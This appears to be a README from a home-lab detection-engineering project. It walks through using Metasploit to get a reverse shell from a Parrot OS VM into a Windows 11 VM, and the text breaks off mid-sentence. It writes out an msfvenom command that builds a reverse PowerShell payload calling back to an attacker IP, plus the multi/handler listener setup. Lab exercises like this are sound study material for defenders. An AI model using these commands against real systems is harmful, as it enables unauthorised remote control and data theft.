# Metasploit Reverse Shell

<br />

<p align="center">
<img src="https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1469039917/hodwdopd059vkn2k1b5a.png" height="30%" width="30%" alt="Detection Engineering Logo Team Ghost"/>
</p>


<h2>Description</h2>

In this section of the project we are going to be using Metasploit to spawn a reverse shell into our Windows 11 VM and exfiltrate some data. A reverse shell is a type of remote shell where the target machine initiates a connection to the attacker's machine, providing the attacker with control over the target.

</br>

<h2>Reverse Shell Attack</h2>

<h3>Attack Setup</h3>

The first thing we need to do to set up this attack is to open an http server on our Parrot OS VM. To do this open up a terminal and enter in this command:

```Bash

python -m http.server 8000

```

<p align="center">
<img src="https://i.imgur.com/fcGQLBq.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Next we are going to create a shell.bat file with code that will allow us to spawn a reverse shell. First, make sure that you are in the Desktop directory in your terminal then execute this command:

```Bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.0.0.5 lport=4689 > shell.bat
```

This command creates a reverse shell payload for Windows that uses PowerShell to connect back to our Parrot OS VM at IP address 10.0.0.5 on port 4689. The payload is saved as a batch file (shell.bat), which, when executed on our Windows 11 VM machine, will establish a reverse shell connection, giving us remote control over the Windows 11 VM.

<p align="center">
<img src="https://i.imgur.com/cSCiapf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Afterwards we need to set up the multi-handler to listen for our payload to spawn the reverse shell. To do this enter in this series of commands:

```Bash
sudo msfconsole
use exploit/multi/handler
set lhost 10.0.0.5
set lport 4689
```

<p align="center">
<img src="https://i.imgur.com/GNc4zvq.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, download the .txt file from this page and  

We are now ready to execute the attack.

</br>

<h3>Attack Execution</h3>

To launch this attack we are going to execute a .bat script that I have provided named "Reverse Shell.bat" on our Windows 11 VM. First, on our Parrot OS VM inside the Metasploit console enter the command "run" to have the multi-handler start listening for the payload. Next, on our Windows 11 VM execute the .bat file and wait until the reverse shell has spawned. Now that we have 
